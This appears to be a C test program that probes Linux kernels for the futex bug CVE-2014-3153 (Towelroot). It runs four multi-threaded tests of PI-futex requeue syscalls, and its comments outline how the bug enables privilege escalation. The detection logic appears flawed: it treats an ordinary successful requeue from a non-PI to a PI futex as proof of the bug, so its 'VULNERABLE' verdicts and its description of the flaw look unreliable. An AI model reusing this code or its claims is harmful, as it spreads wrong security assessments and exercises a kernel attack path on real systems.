/*
 * futex_test.c — Test if CVE-2014-3153 (Towelroot) futex bug is present
 *
 * The vulnerability: FUTEX_CMP_REQUEUE_PI allows requeuing from a non-PI
 * futex to a PI futex without proper validation. This creates a dangling
 * stack-based rt_mutex_waiter that enables privilege escalation.
 *
 * Test: If FUTEX_CMP_REQUEUE_PI succeeds in requeuing a waiter from
 * a non-PI source futex, the bug is present.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <limits.h>
#include <linux/futex.h>

static int *futex1;  /* non-PI futex (wait source) */
static int *futex2;  /* PI futex (requeue target) */
static volatile int waiter_ready = 0;
static volatile int test_done = 0;

/*
 * Waiter thread: calls FUTEX_WAIT_REQUEUE_PI on futex1,
 * expecting to be requeued to futex2.
 */
static void *waiter_thread(void *arg) {
    int ret;
    struct timespec ts = { .tv_sec = 5, .tv_nsec = 0 };

    printf("[waiter] Starting FUTEX_WAIT_REQUEUE_PI on futex1...\n");
    waiter_ready = 1;

    ret = syscall(SYS_futex, futex1, FUTEX_WAIT_REQUEUE_PI, 0,
                  &ts, futex2, 0);
    printf("[waiter] FUTEX_WAIT_REQUEUE_PI returned %d, errno=%d (%s)\n",
           ret, errno, strerror(errno));

    /* If we were requeued to futex2 (a PI futex), we need to unlock it */
    if (ret == 0) {
        printf("[waiter] Was requeued and woken — unlocking PI futex...\n");
        ret = syscall(SYS_futex, futex2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        printf("[waiter] FUTEX_UNLOCK_PI: ret=%d errno=%d\n", ret, errno);
    }

    test_done = 1;
    return (void*)(long)ret;
}

/*
 * Test 1: Basic vulnerability check
 * Try to requeue from non-PI futex1 to PI futex2
 */
static void test_vuln_check(void) {
    printf("\n=== Test 1: CVE-2014-3153 Vulnerability Check ===\n");

    *futex1 = 0;
    *futex2 = 0;
    waiter_ready = 0;
    test_done = 0;

    pthread_t tid;
    pthread_create(&tid, NULL, waiter_thread, NULL);

    /* Wait for waiter to enter FUTEX_WAIT_REQUEUE_PI */
    while (!waiter_ready) usleep(1000);
    usleep(50000);  /* extra settling time */

    printf("[main] Attempting FUTEX_CMP_REQUEUE_PI (non-PI → PI)...\n");
    printf("[main] futex1=%d, futex2=%d\n", *futex1, *futex2);

    /*
     * FUTEX_CMP_REQUEUE_PI args:
     *   uaddr1 = futex1 (non-PI, where waiter is sleeping)
     *   val    = 1 (wake at most 1 waiter)
     *   val2   = 0 (requeue at most 0, but we want to see if validation fails)
     *   uaddr2 = futex2 (PI futex, requeue target)
     *   val3   = 0 (expected value at futex1)
     */
    int ret = syscall(SYS_futex, futex1, FUTEX_CMP_REQUEUE_PI,
                      1,           /* val: wake at most 1 */
                      (void*)INT_MAX, /* val2: requeue at most INT_MAX */
                      futex2,      /* uaddr2: PI futex */
                      *futex1);    /* val3: expected value at futex1 */

    printf("[main] FUTEX_CMP_REQUEUE_PI returned %d, errno=%d (%s)\n",
           ret, errno, strerror(errno));

    if (ret > 0) {
        printf("[!!!] BUG IS PRESENT — successfully requeued %d waiters!\n", ret);
        printf("[!!!] CVE-2014-3153 (Towelroot) is EXPLOITABLE on this kernel!\n");
    } else if (ret == 0) {
        printf("[*] Returned 0 — no waiters requeued (waiter may not have blocked yet)\n");
    } else if (errno == EINVAL) {
        printf("[-] EINVAL — bug is PATCHED (proper PI validation)\n");
    } else {
        printf("[?] Unexpected result\n");
    }

    /* Clean up: wake the waiter if still waiting */
    if (!test_done) {
        /* Try waking with FUTEX_WAKE first */
        syscall(SYS_futex, futex1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        usleep(100000);
        if (!test_done) {
            /* Try PI unlock */
            syscall(SYS_futex, futex2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            usleep(100000);
        }
    }

    pthread_join(tid, NULL);
}

/*
 * Test 2: Verify PI futex basic operations work
 */
static void test_pi_basic(void) {
    printf("\n=== Test 2: PI Futex Basic Operations ===\n");

    *futex2 = 0;

    /* Lock the PI futex */
    int ret = syscall(SYS_futex, futex2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[*] FUTEX_LOCK_PI: ret=%d errno=%d, futex2=%d\n", ret, errno, *futex2);

    if (ret == 0) {
        printf("[+] PI futex locked. Value should contain our TID (%d): %d\n",
               (int)syscall(SYS_gettid), *futex2);

        /* Unlock */
        ret = syscall(SYS_futex, futex2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        printf("[*] FUTEX_UNLOCK_PI: ret=%d errno=%d, futex2=%d\n", ret, errno, *futex2);
    }
}

/*
 * Test 3: Multi-thread requeue race (actual exploit condition)
 */
static void *waiter_thread_race(void *arg) {
    int idx = (int)(long)arg;
    struct timespec ts = { .tv_sec = 3, .tv_nsec = 0 };

    int ret = syscall(SYS_futex, futex1, FUTEX_WAIT_REQUEUE_PI, 0,
                      &ts, futex2, 0);
    printf("[waiter %d] returned %d, errno=%d (%s)\n",
           idx, ret, errno, strerror(errno));

    if (ret == 0) {
        /* Successfully requeued and woken — unlock PI futex */
        syscall(SYS_futex, futex2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    }
    return NULL;
}

static void test_requeue_race(void) {
    printf("\n=== Test 3: Multi-Waiter Requeue Test ===\n");

    *futex1 = 0;
    *futex2 = 0;

    #define NUM_WAITERS 4
    pthread_t tids[NUM_WAITERS];

    for (int i = 0; i < NUM_WAITERS; i++) {
        pthread_create(&tids[i], NULL, waiter_thread_race, (void*)(long)i);
    }

    usleep(100000); /* Let all waiters enter the futex wait */

    printf("[main] Requeuing waiters from futex1 to futex2...\n");

    /* Try to requeue all waiters */
    int ret = syscall(SYS_futex, futex1, FUTEX_CMP_REQUEUE_PI,
                      1,              /* wake 1 */
                      (void*)(long)(NUM_WAITERS - 1), /* requeue rest */
                      futex2,
                      *futex1);
    printf("[main] FUTEX_CMP_REQUEUE_PI: ret=%d, errno=%d (%s)\n",
           ret, errno, strerror(errno));

    if (ret > 0) {
        printf("[!!!] Requeued %d waiters — VULNERABLE!\n", ret);
    } else if (ret < 0 && errno == EINVAL) {
        printf("[-] EINVAL — PATCHED\n");
    }

    /* Wake any remaining waiters */
    usleep(100000);
    syscall(SYS_futex, futex1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
    syscall(SYS_futex, futex2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

    for (int i = 0; i < NUM_WAITERS; i++) {
        struct timespec join_ts;
        clock_gettime(CLOCK_REALTIME, &join_ts);
        join_ts.tv_sec += 5;
        if (pthread_timedjoin_np(tids[i], NULL, &join_ts) != 0) {
            printf("[!] Waiter %d didn't exit, cancelling\n", i);
            pthread_cancel(tids[i]);
            pthread_join(tids[i], NULL);
        }
    }
}

/*
 * Test 4: Check if FUTEX_WAIT_REQUEUE_PI accepts non-PI target
 * (another variant of the bug)
 */
static void *waiter_thread_nonpi(void *arg) {
    struct timespec ts = { .tv_sec = 2, .tv_nsec = 0 };
    int ret = syscall(SYS_futex, futex1, FUTEX_WAIT_REQUEUE_PI, 0,
                      &ts, futex2, 0);
    printf("[nonpi-waiter] returned %d, errno=%d (%s)\n",
           ret, errno, strerror(errno));
    return NULL;
}

static void test_nonpi_target(void) {
    printf("\n=== Test 4: Non-PI Target Validation ===\n");

    *futex1 = 0;
    *futex2 = 0;  /* NOT locked as PI — value is 0 */

    pthread_t tid;
    pthread_create(&tid, NULL, waiter_thread_nonpi, NULL);
    usleep(100000);

    /* futex2 is NOT a PI futex (nobody locked it with FUTEX_LOCK_PI) */
    /* A patched kernel should reject requeue to non-PI target */
    int ret = syscall(SYS_futex, futex1, FUTEX_CMP_REQUEUE_PI,
                      0, (void*)1, futex2, *futex1);
    printf("[main] REQUEUE to non-PI target: ret=%d, errno=%d (%s)\n",
           ret, errno, strerror(errno));

    if (ret >= 0) {
        printf("[!!!] Accepted non-PI target — VULNERABLE!\n");
    } else if (errno == EINVAL) {
        printf("[-] Rejected non-PI target — partially patched\n");
    }

    syscall(SYS_futex, futex1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
    syscall(SYS_futex, futex2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

    struct timespec join_ts;
    clock_gettime(CLOCK_REALTIME, &join_ts);
    join_ts.tv_sec += 5;
    if (pthread_timedjoin_np(tid, NULL, &join_ts) != 0) {
        pthread_cancel(tid);
        pthread_join(tid, NULL);
    }
}

int main(void) {
    printf("=== CVE-2014-3153 (Towelroot) Futex Test ===\n");
    printf("[*] pid=%d, tid=%d, uid=%d\n",
           getpid(), (int)syscall(SYS_gettid), getuid());

    /* Shared memory for futexes */
    futex1 = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                  MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    futex2 = (int*)((char*)futex1 + 128);

    test_pi_basic();
    test_vuln_check();
    test_requeue_race();
    test_nonpi_target();

    printf("\n=== All tests complete ===\n");
    munmap(futex1, 4096);
    return 0;
}
